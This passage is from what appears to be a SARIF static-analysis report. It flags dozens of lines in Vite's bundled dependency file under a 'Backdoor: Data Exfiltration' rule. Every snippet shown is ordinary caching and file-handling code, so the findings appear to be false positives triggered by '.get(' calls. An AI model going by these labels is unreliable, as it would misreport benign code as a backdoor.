                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 19080,
                  "startColumn": 20,
                  "endLine": 19080,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\t\t\t\t}\n\t\t\t})\n\t\t\t.catch((e) => {\n\t\t\t\tif (this.#parsed.get(file) === result) {\n\t\t\t\t\tthis.#parsed.set(file, e);\n\t\t\t\t}\n\t\t\t});\n",
                    "rendered": {
                      "text": "\t\t\t\t}\n\t\t\t})\n\t\t\t.catch((e) => {\n\t\t\t\tif (this.#parsed.get(file) === result) {\n\t\t\t\t\tthis.#parsed.set(file, e);\n\t\t\t\t}\n\t\t\t});\n",
                      "markdown": "`\t\t\t\t}\n\t\t\t})\n\t\t\t.catch((e) => {\n\t\t\t\tif (this.#parsed.get(file) === result) {\n\t\t\t\t\tthis.#parsed.set(file, e);\n\t\t\t\t}\n\t\t\t});\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 19075,
                  "startColumn": 20,
                  "endLine": 19075,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\t\tthis.#parsed.set(file, result);\n\t\tresult\n\t\t\t.then((parsed) => {\n\t\t\t\tif (this.#parsed.get(file) === result) {\n\t\t\t\t\tthis.#parsed.set(file, parsed);\n\t\t\t\t}\n\t\t\t})\n",
                    "rendered": {
                      "text": "\t\tthis.#parsed.set(file, result);\n\t\tresult\n\t\t\t.then((parsed) => {\n\t\t\t\tif (this.#parsed.get(file) === result) {\n\t\t\t\t\tthis.#parsed.set(file, parsed);\n\t\t\t\t}\n\t\t\t})\n",
                      "markdown": "`\t\tthis.#parsed.set(file, result);\n\t\tresult\n\t\t\t.then((parsed) => {\n\t\t\t\tif (this.#parsed.get(file) === result) {\n\t\t\t\t\tthis.#parsed.set(file, parsed);\n\t\t\t\t}\n\t\t\t})\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 19049,
                  "startColumn": 28,
                  "endLine": 19049,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\t * @throws {unknown} if cached value is an error\n\t */\n\tgetParseResult(file) {\n\t\tconst value = this.#parsed.get(file);\n\t\tif (value.then || value.tsconfig) {\n\t\t\treturn value;\n\t\t} else {\n",
                    "rendered": {
                      "text": "\t * @throws {unknown} if cached value is an error\n\t */\n\tgetParseResult(file) {\n\t\tconst value = this.#parsed.get(file);\n\t\tif (value.then || value.tsconfig) {\n\t\t\treturn value;\n\t\t} else {\n",
                      "markdown": "`\t * @throws {unknown} if cached value is an error\n\t */\n\tgetParseResult(file) {\n\t\tconst value = this.#parsed.get(file);\n\t\tif (value.then || value.tsconfig) {\n\t\t\treturn value;\n\t\t} else {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 19025,
                  "startColumn": 33,
                  "endLine": 19025,
                  "endColumn": 38,
                  "snippet": {
                    "text": "\t */\n\tgetConfigPath(dir, configName = 'tsconfig.json') {\n\t\tconst key = `${dir}/${configName}`;\n\t\tconst value = this.#configPaths.get(key);\n\t\tif (value == null || value.length || value.then) {\n\t\t\treturn value;\n\t\t} else {\n",
                    "rendered": {
                      "text": "\t */\n\tgetConfigPath(dir, configName = 'tsconfig.json') {\n\t\tconst key = `${dir}/${configName}`;\n\t\tconst value = this.#configPaths.get(key);\n\t\tif (value == null || value.length || value.then) {\n\t\t\treturn value;\n\t\t} else {\n",
                      "markdown": "`\t */\n\tgetConfigPath(dir, configName = 'tsconfig.json') {\n\t\tconst key = `${dir}/${configName}`;\n\t\tconst value = this.#configPaths.get(key);\n\t\tif (value == null || value.length || value.then) {\n\t\t\treturn value;\n\t\t} else {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 18275,
                  "startColumn": 29,
                  "endLine": 18275,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\n\t\t// complex pattern, use regex to check it\n\t\tif (PATTERN_REGEX_CACHE.has(resolvedPattern)) {\n\t\t\treturn PATTERN_REGEX_CACHE.get(resolvedPattern).test(filename);\n\t\t}\n\t\tconst regex = pattern2regex(resolvedPattern, allowJs);\n\t\tPATTERN_REGEX_CACHE.set(resolvedPattern, regex);\n",
                    "rendered": {
                      "text": "\n\t\t// complex pattern, use regex to check it\n\t\tif (PATTERN_REGEX_CACHE.has(resolvedPattern)) {\n\t\t\treturn PATTERN_REGEX_CACHE.get(resolvedPattern).test(filename);\n\t\t}\n\t\tconst regex = pattern2regex(resolvedPattern, allowJs);\n\t\tPATTERN_REGEX_CACHE.set(resolvedPattern, regex);\n",
                      "markdown": "`\n\t\t// complex pattern, use regex to check it\n\t\tif (PATTERN_REGEX_CACHE.has(resolvedPattern)) {\n\t\t\treturn PATTERN_REGEX_CACHE.get(resolvedPattern).test(filename);\n\t\t}\n\t\tconst regex = pattern2regex(resolvedPattern, allowJs);\n\t\tPATTERN_REGEX_CACHE.set(resolvedPattern, regex);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17079,
                  "startColumn": 48,
                  "endLine": 17079,
                  "endColumn": 53,
                  "snippet": {
                    "text": "      continue;\n    }\n    if (nested?.has(file)) {\n      emptyDir(path$n.resolve(dir, file), nested.get(file));\n    } else {\n      fs__default.rmSync(path$n.resolve(dir, file), { recursive: true, force: true });\n    }\n",
                    "rendered": {
                      "text": "      continue;\n    }\n    if (nested?.has(file)) {\n      emptyDir(path$n.resolve(dir, file), nested.get(file));\n    } else {\n      fs__default.rmSync(path$n.resolve(dir, file), { recursive: true, force: true });\n    }\n",
                      "markdown": "`      continue;\n    }\n    if (nested?.has(file)) {\n      emptyDir(path$n.resolve(dir, file), nested.get(file));\n    } else {\n      fs__default.rmSync(path$n.resolve(dir, file), { recursive: true, force: true });\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17060,
                  "startColumn": 33,
                  "endLine": 17060,
                  "endColumn": 38,
                  "snippet": {
                    "text": "        if (matched) {\n          nested ??= /* @__PURE__ */ new Map();\n          const [, nestedDir, skipPath] = matched;\n          let nestedSkip = nested.get(nestedDir);\n          if (!nestedSkip) {\n            nestedSkip = [];\n            nested.set(nestedDir, nestedSkip);\n",
                    "rendered": {
                      "text": "        if (matched) {\n          nested ??= /* @__PURE__ */ new Map();\n          const [, nestedDir, skipPath] = matched;\n          let nestedSkip = nested.get(nestedDir);\n          if (!nestedSkip) {\n            nestedSkip = [];\n            nested.set(nestedDir, nestedSkip);\n",
                      "markdown": "`        if (matched) {\n          nested ??= /* @__PURE__ */ new Map();\n          const [, nestedDir, skipPath] = matched;\n          let nestedSkip = nested.get(nestedDir);\n          if (!nestedSkip) {\n            nestedSkip = [];\n            nested.set(nestedDir, nestedSkip);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 16689,
                  "startColumn": 30,
                  "endLine": 16689,
                  "endColumn": 35,
                  "snippet": {
                    "text": "}\nfunction getFnpdCache(packageCache, basedir, originalBasedir) {\n  const cacheKey = getFnpdCacheKey(basedir);\n  const pkgData = packageCache.get(cacheKey);\n  if (pkgData) {\n    traverseBetweenDirs(originalBasedir, basedir, (dir) => {\n      packageCache.set(getFnpdCacheKey(dir), pkgData);\n",
                    "rendered": {
                      "text": "}\nfunction getFnpdCache(packageCache, basedir, originalBasedir) {\n  const cacheKey = getFnpdCacheKey(basedir);\n  const pkgData = packageCache.get(cacheKey);\n  if (pkgData) {\n    traverseBetweenDirs(originalBasedir, basedir, (dir) => {\n      packageCache.set(getFnpdCacheKey(dir), pkgData);\n",
                      "markdown": "`}\nfunction getFnpdCache(packageCache, basedir, originalBasedir) {\n  const cacheKey = getFnpdCacheKey(basedir);\n  const pkgData = packageCache.get(cacheKey);\n  if (pkgData) {\n    traverseBetweenDirs(originalBasedir, basedir, (dir) => {\n      packageCache.set(getFnpdCacheKey(dir), pkgData);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 16670,
                  "startColumn": 30,
                  "endLine": 16670,
                  "endColumn": 35,
                  "snippet": {
                    "text": "}\nfunction getRpdCache(packageCache, pkgName, basedir, originalBasedir, preserveSymlinks) {\n  const cacheKey = getRpdCacheKey(pkgName, basedir, preserveSymlinks);\n  const pkgData = packageCache.get(cacheKey);\n  if (pkgData) {\n    traverseBetweenDirs(originalBasedir, basedir, (dir) => {\n      packageCache.set(getRpdCacheKey(pkgName, dir, preserveSymlinks), pkgData);\n",
                    "rendered": {
                      "text": "}\nfunction getRpdCache(packageCache, pkgName, basedir, originalBasedir, preserveSymlinks) {\n  const cacheKey = getRpdCacheKey(pkgName, basedir, preserveSymlinks);\n  const pkgData = packageCache.get(cacheKey);\n  if (pkgData) {\n    traverseBetweenDirs(originalBasedir, basedir, (dir) => {\n      packageCache.set(getRpdCacheKey(pkgName, dir, preserveSymlinks), pkgData);\n",
                      "markdown": "`}\nfunction getRpdCache(packageCache, pkgName, basedir, originalBasedir, preserveSymlinks) {\n  const cacheKey = getRpdCacheKey(pkgName, basedir, preserveSymlinks);\n  const pkgData = packageCache.get(cacheKey);\n  if (pkgData) {\n    traverseBetweenDirs(originalBasedir, basedir, (dir) => {\n      packageCache.set(getRpdCacheKey(pkgName, dir, preserveSymlinks), pkgData);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 16508,
                  "startColumn": 56,
                  "endLine": 16508,
                  "endColumn": 61,
                  "snippet": {
                    "text": "function resolvePackageData(pkgName, basedir, preserveSymlinks = false, packageCache) {\n  if (pnp) {\n    const cacheKey = getRpdCacheKey(pkgName, basedir, preserveSymlinks);\n    if (packageCache?.has(cacheKey)) return packageCache.get(cacheKey);\n    try {\n      const pkg = pnp.resolveToUnqualified(pkgName, basedir, {\n        considerBuiltins: false\n",
                    "rendered": {
                      "text": "function resolvePackageData(pkgName, basedir, preserveSymlinks = false, packageCache) {\n  if (pnp) {\n    const cacheKey = getRpdCacheKey(pkgName, basedir, preserveSymlinks);\n    if (packageCache?.has(cacheKey)) return packageCache.get(cacheKey);\n    try {\n      const pkg = pnp.resolveToUnqualified(pkgName, basedir, {\n        considerBuiltins: false\n",
                      "markdown": "`function resolvePackageData(pkgName, basedir, preserveSymlinks = false, packageCache) {\n  if (pnp) {\n    const cacheKey = getRpdCacheKey(pkgName, basedir, preserveSymlinks);\n    if (packageCache?.has(cacheKey)) return packageCache.get(cacheKey);\n    try {\n      const pkg = pnp.resolveToUnqualified(pkgName, basedir, {\n        considerBuiltins: false\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 13832,
                  "startColumn": 65,
                  "endLine": 13832,
                  "endColumn": 70,
                  "snippet": {
                    "text": "                topLevelDefineCompiledEsmExpressions.push({ node, type: flattened.name });\n              }\n            } else {\n              const exportsAssignments = exportsAssignmentsByName.get(exportName) || {\n                nodes: [],\n                scopes: new Set()\n              };\n",
                    "rendered": {
                      "text": "                topLevelDefineCompiledEsmExpressions.push({ node, type: flattened.name });\n              }\n            } else {\n              const exportsAssignments = exportsAssignmentsByName.get(exportName) || {\n                nodes: [],\n                scopes: new Set()\n              };\n",
                      "markdown": "`                topLevelDefineCompiledEsmExpressions.push({ node, type: flattened.name });\n              }\n            } else {\n              const exportsAssignments = exportsAssignmentsByName.get(exportName) || {\n                nodes: [],\n                scopes: new Set()\n              };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 13066,
                  "startColumn": 60,
                  "endLine": 13066,
                  "endColumn": 65,
                  "snippet": {
                    "text": "        });\n      },\n    isCurrentlyResolving(source, parentId) {\n      const currentlyResolvingForParent = currentlyResolving.get(parentId);\n      return currentlyResolvingForParent && currentlyResolvingForParent.has(source);\n    }\n  };\n",
                    "rendered": {
                      "text": "        });\n      },\n    isCurrentlyResolving(source, parentId) {\n      const currentlyResolvingForParent = currentlyResolving.get(parentId);\n      return currentlyResolvingForParent && currentlyResolvingForParent.has(source);\n    }\n  };\n",
                      "markdown": "`        });\n      },\n    isCurrentlyResolving(source, parentId) {\n      const currentlyResolvingForParent = currentlyResolving.get(parentId);\n      return currentlyResolvingForParent && currentlyResolvingForParent.has(source);\n    }\n  };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 13020,
                  "startColumn": 62,
                  "endLine": 13020,
                  "endColumn": 67,
                  "snippet": {
                    "text": "        parentMeta.requires = [];\n        parentMeta.isRequiredCommonJS = Object.create(null);\n        setInitialParentType(parentId, isParentCommonJS);\n        const currentlyResolvingForParent = currentlyResolving.get(parentId) || new Set();\n        currentlyResolving.set(parentId, currentlyResolvingForParent);\n        const requireTargets = await Promise.all(\n          sources.map(async ({ source, isConditional }) => {\n",
                    "rendered": {
                      "text": "        parentMeta.requires = [];\n        parentMeta.isRequiredCommonJS = Object.create(null);\n        setInitialParentType(parentId, isParentCommonJS);\n        const currentlyResolvingForParent = currentlyResolving.get(parentId) || new Set();\n        currentlyResolving.set(parentId, currentlyResolvingForParent);\n        const requireTargets = await Promise.all(\n          sources.map(async ({ source, isConditional }) => {\n",
                      "markdown": "`        parentMeta.requires = [];\n        parentMeta.isRequiredCommonJS = Object.create(null);\n        setInitialParentType(parentId, isParentCommonJS);\n        const currentlyResolvingForParent = currentlyResolving.get(parentId) || new Set();\n        currentlyResolving.set(parentId, currentlyResolvingForParent);\n        const requireTargets = await Promise.all(\n          sources.map(async ({ source, isConditional }) => {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 12772,
                  "startColumn": 60,
                  "endLine": 12772,
                  "endColumn": 65,
                  "snippet": {
                    "text": "      ) {\n        return null;\n      }\n      const currentlyResolvingForParent = currentlyResolving.get(importer);\n      if (currentlyResolvingForParent && currentlyResolvingForParent.has(importee)) {\n        this.warn({\n          code: 'THIS_RESOLVE_WITHOUT_OPTIONS',\n",
                    "rendered": {
                      "text": "      ) {\n        return null;\n      }\n      const currentlyResolvingForParent = currentlyResolving.get(importer);\n      if (currentlyResolvingForParent && currentlyResolvingForParent.has(importee)) {\n        this.warn({\n          code: 'THIS_RESOLVE_WITHOUT_OPTIONS',\n",
                      "markdown": "`      ) {\n        return null;\n      }\n      const currentlyResolvingForParent = currentlyResolving.get(importer);\n      if (currentlyResolvingForParent && currentlyResolvingForParent.has(importee)) {\n        this.warn({\n          code: 'THIS_RESOLVE_WITHOUT_OPTIONS',\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 10008,
                  "startColumn": 38,
                  "endLine": 10008,
                  "endColumn": 43,
                  "snippet": {
                    "text": "    // a hasWalkedCache that's a copy of this one\n    // then we're going to call\n    filterEntries(parent, entries) {\n        const patterns = this.subwalks.get(parent);\n        // put matches and entry walks into the results processor\n        const results = this.child();\n        for (const e of entries) {\n",
                    "rendered": {
                      "text": "    // a hasWalkedCache that's a copy of this one\n    // then we're going to call\n    filterEntries(parent, entries) {\n        const patterns = this.subwalks.get(parent);\n        // put matches and entry walks into the results processor\n        const results = this.child();\n        for (const e of entries) {\n",
                      "markdown": "`    // a hasWalkedCache that's a copy of this one\n    // then we're going to call\n    filterEntries(parent, entries) {\n        const patterns = this.subwalks.get(parent);\n        // put matches and entry walks into the results processor\n        const results = this.child();\n        for (const e of entries) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 9879,
                  "startColumn": 50,
                  "endLine": 9879,
                  "endColumn": 55,
                  "snippet": {
                    "text": "        return subs;\n    }\n    entries() {\n        return this.keys().map(k => [k, this.store.get(k)]);\n    }\n    keys() {\n        return [...this.store.keys()].filter(t => t.canReaddir());\n",
                    "rendered": {
                      "text": "        return subs;\n    }\n    entries() {\n        return this.keys().map(k => [k, this.store.get(k)]);\n    }\n    keys() {\n        return [...this.store.keys()].filter(t => t.canReaddir());\n",
                      "markdown": "`        return subs;\n    }\n    entries() {\n        return this.keys().map(k => [k, this.store.get(k)]);\n    }\n    keys() {\n        return [...this.store.keys()].filter(t => t.canReaddir());\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 9870,
                  "startColumn": 31,
                  "endLine": 9870,
                  "endColumn": 36,
                  "snippet": {
                    "text": "            this.store.set(target, [pattern]);\n    }\n    get(target) {\n        const subs = this.store.get(target);\n        /* c8 ignore start */\n        if (!subs) {\n            throw new Error('attempting to walk unknown path');\n",
                    "rendered": {
                      "text": "            this.store.set(target, [pattern]);\n    }\n    get(target) {\n        const subs = this.store.get(target);\n        /* c8 ignore start */\n        if (!subs) {\n            throw new Error('attempting to walk unknown path');\n",
                      "markdown": "`            this.store.set(target, [pattern]);\n    }\n    get(target) {\n        const subs = this.store.get(target);\n        /* c8 ignore start */\n        if (!subs) {\n            throw new Error('attempting to walk unknown path');\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 9860,
                  "startColumn": 31,
                  "endLine": 9860,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        if (!target.canReaddir()) {\n            return;\n        }\n        const subs = this.store.get(target);\n        if (subs) {\n            if (!subs.find(p => p.globString() === pattern.globString())) {\n                subs.push(pattern);\n",
                    "rendered": {
                      "text": "        if (!target.canReaddir()) {\n            return;\n        }\n        const subs = this.store.get(target);\n        if (subs) {\n            if (!subs.find(p => p.globString() === pattern.globString())) {\n                subs.push(pattern);\n",
                      "markdown": "`        if (!target.canReaddir()) {\n            return;\n        }\n        const subs = this.store.get(target);\n        if (subs) {\n            if (!subs.find(p => p.globString() === pattern.globString())) {\n                subs.push(pattern);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 9838,
                  "startColumn": 34,
                  "endLine": 9838,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    store = new Map();\n    add(target, absolute, ifDir) {\n        const n = (absolute ? 2 : 0) | (ifDir ? 1 : 0);\n        const current = this.store.get(target);\n        this.store.set(target, current === undefined ? n : n & current);\n    }\n    // match, absolute, ifdir\n",
                    "rendered": {
                      "text": "    store = new Map();\n    add(target, absolute, ifDir) {\n        const n = (absolute ? 2 : 0) | (ifDir ? 1 : 0);\n        const current = this.store.get(target);\n        this.store.set(target, current === undefined ? n : n & current);\n    }\n    // match, absolute, ifdir\n",
                      "markdown": "`    store = new Map();\n    add(target, absolute, ifDir) {\n        const n = (absolute ? 2 : 0) | (ifDir ? 1 : 0);\n        const current = this.store.get(target);\n        this.store.set(target, current === undefined ? n : n & current);\n    }\n    // match, absolute, ifdir\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 9822,
                  "startColumn": 33,
                  "endLine": 9822,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    }\n    storeWalked(target, pattern) {\n        const fullpath = target.fullpath();\n        const cached = this.store.get(fullpath);\n        if (cached)\n            cached.add(pattern.globString());\n        else\n",
                    "rendered": {
                      "text": "    }\n    storeWalked(target, pattern) {\n        const fullpath = target.fullpath();\n        const cached = this.store.get(fullpath);\n        if (cached)\n            cached.add(pattern.globString());\n        else\n",
                      "markdown": "`    }\n    storeWalked(target, pattern) {\n        const fullpath = target.fullpath();\n        const cached = this.store.get(fullpath);\n        if (cached)\n            cached.add(pattern.globString());\n        else\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 9818,
                  "startColumn": 25,
                  "endLine": 9818,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        return new HasWalkedCache(new Map(this.store));\n    }\n    hasWalked(target, pattern) {\n        return this.store.get(target.fullpath())?.has(pattern.globString());\n    }\n    storeWalked(target, pattern) {\n        const fullpath = target.fullpath();\n",
                    "rendered": {
                      "text": "        return new HasWalkedCache(new Map(this.store));\n    }\n    hasWalked(target, pattern) {\n        return this.store.get(target.fullpath())?.has(pattern.globString());\n    }\n    storeWalked(target, pattern) {\n        const fullpath = target.fullpath();\n",
                      "markdown": "`        return new HasWalkedCache(new Map(this.store));\n    }\n    hasWalked(target, pattern) {\n        return this.store.get(target.fullpath())?.has(pattern.globString());\n    }\n    storeWalked(target, pattern) {\n        const fullpath = target.fullpath();\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 8907,
                  "startColumn": 46,
                  "endLine": 8907,
                  "endColumn": 51,
                  "snippet": {
                    "text": "                break;\n            }\n        }\n        const cached = this.#resolvePosixCache.get(r);\n        if (cached !== undefined) {\n            return cached;\n        }\n",
                    "rendered": {
